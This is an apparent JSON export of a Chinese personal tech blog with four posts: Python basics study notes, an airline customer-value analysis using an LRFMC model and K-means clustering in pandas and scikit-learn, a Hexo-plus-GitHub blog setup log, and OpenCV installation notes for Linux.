使用# python之禅：import this 三、列表 由一系列特定顺序的元素组成，用[]来表示列表。元素用逗号隔开， 3.1访问列表 列表是有序集合，用索引值即可，索引值从0开始 可以使用负数索引： a=[1,2,3,4] a[-1] 4 3.2修改、添加、删除列表元素 修改：使用列表名和索引值修改 增加：append()、insert(position， value) 删除：del()、pop()、remove()，两者的区别是第二种方法可以返回删除的元素，pop(index)可以弹出指定的值。其中remove只删除第一个指定的值3.3组织列表 排序sort(),永久性修改。可以通过修改reverse=True反向排序 排序sorted(),临时性修改。可以通过修改reverse=True反向排序 反转reverse()，注意不是排序 len() 3.4每当访问最后一个元素的时候都是用索引值-1四、操作列表4.1遍历列表 使用for循环，循环是计算机自动完成重复工作的常见方式之一 for in ：这时候接触到代码块了，要注意代码块的缩进规则 4.2创建数值列表 使用range(start, end, steps)产生一系列数字 使用list()将range()产生的数字转成列表 4.3简单统计计算 max() min() sum() 4.4列表解析 只需要一行代码就可以产生列表结构为：类似为[i for i in range(1,11)] 4.5切片 大体的索引结构为：[start:end:step] 可以通过切片来复制列表为一个新的列表[:] 4.6元组tuple 不可变的列表，用（）来表示，不可修改 4.7集合 集合可以用来去掉重复的列表数据 集合的操作：交、并、差、是否为子集 set.add(obj)添加操作 set.remove(obj)删除,若不存在则抛出异常 set.discard(obj)删除，相对于remove()它不会抛出异常。 set.pop()弹出，返回任意的值，所以并不能用来获取弹出的值 set.clear()清除集合 4.8PEP8编码规则： 缩进：主要不要混用制表键和空格，使用编辑器应该设置好制表键与空格的关系字符 行长：不超过80个,编辑器中可以设置视觉线。 五、条件语句 根据条件来进行选择什么样的措施 5.1条件测试检查的标准是条件表达式返回的是True还是False，进而来判断是否执行相应语句=赋值 ==是检查是否相等 ！=不相等检查多个条件用and或者or检查是否在结构中用in或者not in 5.2if语句if condition ： pass elif condition： else： 5.3if语句的用处： 检测异常值，符合异常条件的数据 判断列表是不是空的 注意在使用比价运算符时PEP8提供建议是在运算符号两边添加空格，方便阅读 六、字典 字典是一系列键-值对 用{}表示 6.1使用字典 通过键来访问value 因为字典是一种动态的结构可以随时的添加键值对，是可变的对象，python不关心键值对的添加顺序，只关心相互关系 修改字典中的value是通过key来修改 删除，del, 同修改 字典的键必须是不可变类型 清空字典dict.clear() dict.formkeys(seq,val=None)创建并初始化键值的字典。 在定义好字典时候最好在最后一个键值对后再添加一个逗号，为下一对键值对插入做准备 6.2遍历字典 遍历键值对 item()返回键、值 遍历键keys()或者值 values() 遍历时考虑顺序遍历的话可以使用sorted()函数来进行对keys排序 遍历值得时考虑重复数据可以使用set做一个转换消除重复值 6.3嵌套 {[]}、[{}].但是在字典中存储列表只能作为value存储 6.4字典类型内置方法 dict.clear()清空字典 dict.copy()浅拷贝字典 dict.fromkeys(seq，default=None)，创建一个字典，seq是key，并初始化values为默认值。 dict.has_key()判断dict中是否有key dict.items()，返回元组列表 dict.keys() dict.values() dict.pop()同get，不过是返回并删除 dict.get(key，default=None)返回key对应的值，如果没有在dict中的话返回默认值 dict.setdefault(key,default=None) dict.update(dict2)将dict中的键值加入到dict中，并且更新原字典。 七、检测用户输入和while循环 input(info):让程序暂停，等待用户输入一些文本，其中info为提示信息。同样在python2.7中使用raw_input()while用来不断检测 input函数没什么可说的就是使用用户输入数据时要注意做类型的变换 7.1标志对于while，为了使用简单，当条件比较多的时候，可以通过设置标志来判断是否结束循环。 7.2breakbreak用来控制程序，退出循环程序，不在执行剩余代码。 7.3continuecontinue用来控制程序流程，退出当次循环不在进行一下代码，直接跳到下一循环。 八、函数 函数是带有名字的代码块。用来完成特定的功能。 8.1参数 实参：函数调用过程中传递进去的参数 形参：函数定义中的参数8.2传递参数 位置实参：实参与形参位置相同 关键字实参：实参由变量和值组成 使用字典和列表： 函数定义中使用默认值时，要是不传进去实参，函数将会使用默认值 传参方式可以混合使用 8.3返回值 返回值可以简化主程序，将大量的工作放在函数中，使用return返回函数的运算结果。让参数变成可选的在函数定义时设置为空，可以扩展函数的适用范围。 8.4传递任意数量的实参 *args 8.5将函数存储在模块中 使用module_name.function_name()来调用模块中的函数模块 8.6注意事项编写函数时应该注意到，函数名字尽量使用小写字母和下划线，名字要容易解释功能，另外要包含阐述函数功能的注释。 九、类 面对对象编程是最有效的软件编写方法之一，根据类来创建对象，类中定义的是一类对象都有的通用的行为，可以根据对象赋予不同的个性行为。类是用来描述具有同类属性实例的概括词汇，对象是类实例化的个体。Python中类即对象 面对对象设计的三大特性： 封装 继承 多态 9.1创建使用类：class A(object): def __init__(self, *xxx)： pass def a(*xxx): pass ... 一般在Python中首字母大写的是类 类中包含方法（类中的函数）、属性，init()中形参必不可少必须位于其他参数之前在python创建实例的时候，将自动传给self，它是一个指定实例本身的引用。以self为前缀的类中的变量都可以被类中其他方法使用。 使用句点表示法使用类中属性和调用类中方法. 9.2修改属性的值 直接修改，使用实例访问 通过方法修改属性的值 通过方法对属性的值进行递增 9.3继承 一个类继承另一个类时，将自动获得另一个类的所有属性和方法：父类-&gt;子类子类继承了父类的所有属性和方法，还可以定义自己的属性和方法。 子类方法的init()方法：需要先设置父类的属性： class Car(object): def __init__(self, *xxx): pass class Necar(Car): def __init__(self, *xxx): super().__init__(*xxx) 继承之后，可以定义子类的属性和方法，并且可以重写父类的方法，要与父类方法重名当了解了类的之后，在考虑问题是后就需要考虑属性的归属，要根据具体的业务分析编写代码，每种建模思想都没有错只是有效率高低之分，要从实践中总结。 9.4导入类 类可以保存在模块中，然后在需要的时候导入到程序中 from a import A #导入一个类 from a impoert A,B #导入模块中多个类 import a #导入整个模块 from a import b #一个模块中导入另一个模块 自定义工作流程:先开始让代码尽可能简单---确保功能正常后提取功能模块，进行模块独立-----进行模块和文件交互 类中的特殊方法： __init__(self,)构造函数 __new__(slef)通常用于创建不可变数据类型的子类 __del__(self)析构函数 __str__(self)可打印字符串表示 __repr__(self) __unicode__(self) __call__(self)可调用的实例 __nonzero__(self)对对象定义false值 __len__(self) __cmp__(self)对象比较 __lt__(self) __le__(self) __gt__(self) __ge__(self) __eq__(self) __getattr__(self) __setattr__(self) __delattr__(self) __get__(self) __set__(self) __delete__(self) __iter__(self)创建迭代器类 __hash__(self)散列函数值 十、文件和异常 异常：python创建的特殊对象，用于管理程序运行时出现的错误，让程序在面对错误的数据室更健壮。 10.1文件读写 打开模式： t默认文本格式打开 x写模式新建一个文件，如果已经存在会报错。 b二进制模式 +打开一个文件可读可写 r只读，从头开始 rb r+从开头开始可读可写 rb+ w文件不存在会创建文件，如果存在则从头开始写，原内容删除 w+ wb wb+ a如果文件不存在则会创建文件，如果存在则会追加进行写入 ab a+ ab+ 相对路径：一般是当前文件夹内的文件 绝对路径：制定文件夹内的文件 with open(datafile) as file: &#39;&#39;&#39;打开文件读取，并自动关闭&#39;&#39;&#39; data = file.read() print(data) 写入write() 打开文件时可以传入第二个参数，来确定打开的文件操作形式 r：可读 r+：可读写 w+：写到文件末尾 a:附加到文件 主义写入时如果文件不存在会自动生成一个新文件，如果存在设定是w模式时，会自动清除对象文件重新写入。 读取read():返回文件内容readline()：读取一行文件内容，并记录读取位置readlines()：读取每行返回一个列表 文件对象方法和数据属性： f.close() f.fileno() f.flush() f.isatty() f.read() f.readline() f.readlines() f.seek(off,whence=0)移动到指定位置，第一个参数为偏移量。whence中的0表示从开头开始，为1时表示从当前位置开始，2表示从文件末尾开始。 f.tell()返回file内的当前值 f.truncate()截断file。默认为当前位置 f.write() f.writelines(seq)向文件中写入序列，如果需要换行需要在序列中存在。 f.closed布尔类型 f.encoding返回编码类型 f.mode返回打开模式 f.name返回文件名称 f.newlines如果读取到行分隔符则为None 10.2异常 异常是使用try-except代码块来处理的,通过将可能引发错误的代码放进代码块中，可以提高抵御崩溃的能力 try: pass except XxxError: pass else: pass 上面的大致原理是，python尝试执行try中的代码，有一些try代码执行成功的信息放在else中,except告诉程序try中代码执行不成功时应该怎么做。 10.3存储数据 json：是一种数据存储格式，并且会保存数据结构。 json.dump()存储 json.load()加载 10.4重构 重构将代码进行改进，使代码更清晰、容易扩展。将功能代码分成几个小的或者函数进行实现 十一、测试待续","categories":[{"name":"技术经验","slug":"技术经验","permalink":"https://cxpeng.cn/categories/%E6%8A%80%E6%9C%AF%E7%BB%8F%E9%AA%8C/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://cxpeng.cn/tags/Python/"}]},{"title":"航空公司客户价值分析","slug":"航空公司客户价值分析","date":"2019-03-15T02:34:55.000Z","updated":"2020-02-13T03:25:44.568Z","comments":true,"path":"archives/e5d37995.html","link":"","permalink":"https://cxpeng.cn/archives/e5d37995.html","excerpt":"","text":"一、挖掘目标通过分析航空公司用户数据，对客户进行分类，对不同类别的客户进行特征分析，比较不同客户的客户价值，针对不同客户价值的客户采取不同的营销手段，制定相应的营销手段。 数据的属性主要有：客户的基本信息、乘机信息、积分信息。下面就开始介绍一下详细数据挖掘流程。 二、数据挖掘过程：首先考虑我们的目标是为了进行客户价值分类，通常采用的分析模型是RFM模型，也就是消费时间间隔、消费频率、消费金额的指标。但是对于航空行业来说，通过分析可以得知对于长距离低价位和短距离高价位的票价总额相等的客户来说显然M一样但是价值相差很大。这时候选择一定时间累计的飞行里程数和平均折扣系数的平均值代替票价金额作为分析指标，同时针对航空公司有会员制度因此加入客户关系长度作为指标之一，建立起LRFMC模型。 模型 L R F M C 航空公司LRFMC模型 会员入会时间距离观测窗口结束月数 客户最近一次飞机乘坐距离观测窗口结束的月数 客户观测窗口内乘坐的飞机次数 客户在观测窗口中的飞行里程 客户在观测窗口的乘坐舱位对应的折扣系数的平均值 按照我们以上的RFM模型来分析的话，建立分箱图，可以很直观的显示不同客户群体，但是细分类别过多，增加的营销难度和成本。因此采取聚类的方法分析客户价值：K-means 1.数据抽取 选取观测窗口，包括起始日期和时间间隔。 观测窗口内的数据为历史数据，观测结束日期到最新时间点的数据为增量数据。 2.数据探索（explore）数据探索是对异常值和缺失值进行分析，分析出数据的规律和异常值。 1#-*- coding: utf-8 -*-2#对数据进行基本的探索3#返回缺失值个数以及最大最小值45import pandas as pd67datafile= 'E:\\Test_learning\\data\\chapter7\\demo\\data/air_data.csv' #航空原始数据,第一行为属性标签8resultfile = 'E:\\Test_learning\\data\\chapter7\\demo\\data/explore.xls' #数据探索结果表910data = pd.read_csv(datafile, encoding = 'utf-8') #读取原始数据，指定UTF-8编码（需要用文本编辑器将数据装换为UTF-8编码）1112explore = data.describe(percentiles = [], include = 'all').T #包括对数据的基本描述，percentiles参数是指定计算多少的分位数表（如1/4分位数、中位数等）；T是转置，转置后更方便查阅13explore['null'] = len(data)-explore['count'] #describe()函数自动计算非空值数，需要手动计算空值数1415explore = explore[['null', 'max', 'min']]16explore.columns = [u'空值数', u'最大值', u'最小值'] #表头重命名17'''这里只选取部分探索结果。describe()函数自动计算的字段有count（非空值数）、unique（唯一值数）、top（频数最高者）、freq（最高频数）、mean（平均值）、std（方差）、min（最小值）、50%（中位数）、max（最大值）'''1819explore.to_excel(resultfile) #导出结果20print(\"over\") 经过数据探索得到了数据的空值数和最大最小值，并保存结果 3.数据预处理 数据预处理包括数据清洗、属性规约、数据变换 在pandas中数据清洗的处理方式是一次性把满足清洗条件的一行数据全部丢弃。在案例中清洗的是票价为空和（票价为0，折扣不为0，总飞行里程数大于0的记录） 。1#-*- coding: utf-8 -*-2#数据清洗，过滤掉不符合规则的数据34import pandas as pd56datafile= '../data/air_data.csv' #航空原始数据,第一行为属性标签7cleanedfile = '../tmp/data_cleaned.csv' #数据清洗后保存的文件89data = pd.read_csv(datafile,encoding='utf-8') #读取原始数据，指定UTF-8编码（需要用文本编辑器将数据装换为UTF-8编码）1011data = data[data['SUM_YR_1'].notnull()*data['SUM_YR_2'].notnull()] #票价非空值才保留1213#只保留票价非零的，或者平均折扣率与总飞行公里数同时为0的记录。14index1 = data['SUM_YR_1'] != 015index2 = data['SUM_YR_2'] != 016index3 = (data['SEG_KM_SUM'] == 0) &amp; (data['avg_discount'] == 0) #该规则是“与”17data = data[index1 | index2 | index3] #该规则是“或”1819data.to_excel(cleanedfile) #导出结果第二步数据清洗完之后进行属性规约，选择与模型分析相关的属性，去掉一些不相关、弱相关、和冗余的属性。第三步是进行数据变换。将数据进行转换，达到适合模型使用的要求。包括属性的构造和数据标准化根据已有属性分别计算L、R、F、M、C，然后进行数据标准化：1#-*- coding: utf-8 -*-2#标准差标准化34import pandas as pd56datafile = '../data/zscoredata.xls' #需要进行标准化的数据文件；7zscoredfile = '../tmp/zscoreddata.xls' #标准差化后的数据存储路径文件；89#标准化处理10data = pd.read_excel(datafile)11data = (data - data.mean(axis = 0))/(data.std(axis = 0)) #简洁的语句实现了标准化变换，类似地可以实现任何想要的变换。12data.columns=['Z'+i for i in data.columns] #表头重命名。1314data.to_excel(zscoredfile, index = False) #数据写入上面已经通过数据探索和数据与处理处理完数据，下面就是模型构建和训练的过程了。 4.模型构建4.1客户聚类结合业务的理解和分析来确定客户的类别数 使用算法为：K-means算法调用库为：Scikit-Learn下的聚类子库(sklearn.cluster)1 import pandas as pd2from sklearn.cluster import KMeans #导入kmeans算法34datafile = ''5data = pd.read_excel(datafile)67kmodel = KMeans(n_cluster = k, n_jobs = 4)#n_jobs是并行数，一般设置为CPU的个数8kmodel.fit(data)#训练模型9kmodel.cluster_center_#查看聚类中心10kmodel.labels_ #查看个样本对应的类别 4.2客户价值分析（Rank）上面根据模型训练可以得到聚类中心和样本类别，下面对聚类结果进行客户价值的分析。L：客户关系时间长度、R：上次乘坐航班距离观测窗口至结束的时间间隔、F：观测窗口内乘坐航班次数、M：观测窗口内的总的飞行里程、C、舱位票价平均折扣系数。通过对每个客户群体进行分析着五个指标可以将客户分为： 重要保持客户：属于航空公司客户生命周期的稳定期。这类人对公司的贡献最大，也是对理想的客户类型，应该针对这类客户进行差异化管理，提高这类用户的满意度和忠诚度，尽可能延长这类客户的高消费。 重要发展客户：属于航空公司客户生命周期的发展期。这类人在当前贡献值可能不是很高，但是具有发展潜力。航空公司应该努力促使这类人增加在本公司的乘机消费和合作伙伴处的消费，增加他们转向竞争对手的转移成本。 重要挽留客户：属于航空公司客户生命周期管理的衰退期，航空公司应关注这类客户的消费时间和消费次数的变化，要掌握最新的客户信息。对其重点联系，及时营销。 一般客户与低价值客户：这种类型的客户对于航空公司的贡献比较低 对于上面的分类进行客户群体rank，可以得到上诉5类客户群体的优先级别。对于新增的客户信息，考虑业务的实际情况，建议每个月运行模型，对新增客户进行特征分析，适时调整营销策略。最后主要要随着观测窗口的变动进行模型的更新。一般是根据经验进行模型重新训练。 4.3模型应用对各个客户群进行特征分析，制定的营销手段如下： 会员升级与保级：会员等级制度，做的工作是在时间节点进行提醒，或者提供会员促销活动，提高人们的消费欲望和满意度。 交叉销售：跟非航空公司企业合作，会员可以在合作企业消费获得本公司积分，增强与公司的联系。 首次兑换：达到一定的里程数可以兑换免费票或者折扣票，做到deadline提醒，或者提供优惠服务。 三、总结业务上来说客户的识别期和发展期很重要，但是最重要还是在稳定期要有一批优质的稳定客户。因此在进行业务分析时，应该将优先资源投入到这批客户中，做到一对一定制服务。","categories":[{"name":"技术经验","slug":"技术经验","permalink":"https://cxpeng.cn/categories/%E6%8A%80%E6%9C%AF%E7%BB%8F%E9%AA%8C/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://cxpeng.cn/tags/Python/"},{"name":"数据分析","slug":"数据分析","permalink":"https://cxpeng.cn/tags/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/"},{"name":"K_Means","slug":"K-Means","permalink":"https://cxpeng.cn/tags/K-Means/"}]},{"title":"博客搭建记录","slug":"博客搭建记录","date":"2019-03-01T03:21:11.000Z","updated":"2020-02-13T03:25:09.046Z","comments":false,"path":"archives/ee940876.html","link":"","permalink":"https://cxpeng.cn/archives/ee940876.html","excerpt":"","text":"一、前言从去年开始就一直想部署一个可以自己使用的博客，用来记录点东西，省的到后来用到的时候害的重新查询，一直百度。直到这个月要开始找工作了，有一个自己的博客不仅能够用来记录学习路线，还能够更直观的把自己展示给他人看，因此决定自己一搞一个人博客。花了点时间对比部署方案后，选择了最省钱的Hexo+Github,跟随教程花了点时间配置，下面主要记录下配置过程。 二、准备阶段 注册一个github账号 安装node.js、npm 安装git 注：我是在Windows7 里面进行设置部署 三、开始搭建博客1、github中创建仓库在github中新建仓库，并命名为xxx.github.io,注意xxx和你的github的账户名是相同的，后来你网站的域名将会是https：//xxx.github.io.所以为了域名，你可以设置一个好听的仓库名。创建成功后，所有的网站文件都会被上传到这个仓库中。 2、配置SSH key这是为了让自己有权限用git，提交文件到github中来。具体的步骤是在本机中找到./ssh文件夹，我换系统的时候经常没有因此，需要生成：用git bash： ssk-keygen -t rsa -C &#39;emailaddress&#39; 然后按三次回车，就会在c盘user下面生成./ssh文件，将id_rsa.pub中的文本根据下面的配置添加到key中，其中title可以随便起名。 还需要进行配置： git config --global user.name &quot;xxx&quot;// 你的github用户名，非昵称 git config --global user.email &quot;email&quot;// github注册邮箱 3、搭建博客雏形 安装hexo、初始化 npm install -g hexo建立一个文件夹，用于本地blog存储，进入文件夹内，打开git bash并进行初始化： hexo init hexo g #生成 hexo s #启动服务如下： 4、修改主题博客还是用来进行阅读的因此稳定性比较重要，现在用户最多的还是next主题，因此我选用的也是next：下载，还是在刚才的文件夹下使用git bash： git clone https://github.com/iissnan/hexo-theme-next themes/next done之后就可以在根目录下发现有一个theme的文件夹里面有next文件，更改样式时，一般是时修改next文件里面的配置文件。安装好主题之后，可以浏览器打开本地localhost:4000站点进行访问 到现在，基本的博客雏形已经出现了，下面就是开始hexo的配置。 配置部分我直接贴链接了，非常感谢下面大神的指导！ 5、主题优化 http://blog.ynxiu.com/2016/hexo-next-theme-optimize.html https://www.simon96.online/2018/10/12/hexo-tutorial/ http://blog.321zou.com/ 四、问题汇总 后续更新 MarkdownPad2中添加的图片不能显示：先要配置_config.yml,找到post_asset_folder设为true后，以后再创建文章就会在文章目录生成一个同名文件夹，可以将文章配图放在此文件夹中，然后在写文章时下入相对路径就可以。![](图片名) 怎么在文章中添加文件下载：和上一个问题解决办法一样，先修改配置文件，然后再在source下新建文件夹downloads，把需要下载的文件放入到该文件夹下就可以，在以后发布文章时，只要在文中添加 [点击下载](/downloads/filename)之后，这样部署之后的网站，就可以看到下载链接和进行下载文件了。","categories":[{"name":"技术经验","slug":"技术经验","permalink":"https://cxpeng.cn/categories/%E6%8A%80%E6%9C%AF%E7%BB%8F%E9%AA%8C/"}],"tags":[]},{"title":"Linux安装opencv和vscode工具配置","slug":"opencv安装笔记","date":"2018-12-03T13:48:58.000Z","updated":"2020-02-13T03:23:59.684Z","comments":true,"path":"archives/e27e22b8.html","link":"","permalink":"https://cxpeng.cn/archives/e27e22b8.html","excerpt":"","text":"Linux安装opencv和vscode工具配置1、参考opencv官网在Linux上安装opencv的步骤 按照官网文档安装依赖， 官网下载opencv和扩展包的源码source。也可以通过github克隆到本地，注意版本一定是相同的。 利用cmake编译安装： 新建文件夹opencv：mkdir opencv 将扩展包cp到opencv文件夹中 在opencv文件夹中新建build文件夹:mkdir build 进入文件夹：cd build 使用cmake命令进行编译（下面的目录名字我已经统一去掉版本信息）：cmake -D CMAKE_INSTALL_PREFIX=/usr/local -D CMAKE_BUILD_TYPE=Release -D OPENCV_EXTRA_MODULES_PATH=../opencv_contrib/modules .. 编译过程中出现的问题参考第二部分 然后进行安装：sudo make install 安装完成后，可以在终端中使用python，导入opencv的包进行使用： python import cv2 as cv cv.__version__ #查看安装的opencv版本 将opencv的库路径添加到系统路径中去 cd /etc/ld.so.conf.d sudo touch opencv.conf,此时文件中是空的。 写入：/usr/local/lib 使配置生效：sudo ldconfig 在vscode中使用opencv 2、安装过程中遇到的问题。 安装依赖中出现errorE: unable to locate libjasper-dev。 解决办法： sudo add-apt-repository “deb http://security.ubuntu.com/ubuntu xenial-security main” sudo apt update sudo apt install libjasper1 libjasper-dev 编译过程中出现：xxx :No such file or directory 解决办法： find ～ -name xxx 将出现问题的文件路径修改下，在重新编译。 如果上一步没有找到相关的文件，可以去csdn搜索下载，然后在修改。","categories":[{"name":"技术经验","slug":"技术经验","permalink":"https://cxpeng.cn/categories/%E6%8A%80%E6%9C%AF%E7%BB%8F%E9%AA%8C/"}],"tags":[{"name":"opencv","slug":"opencv","permalink":"https://cxpeng.cn/tags/opencv/"}]}]}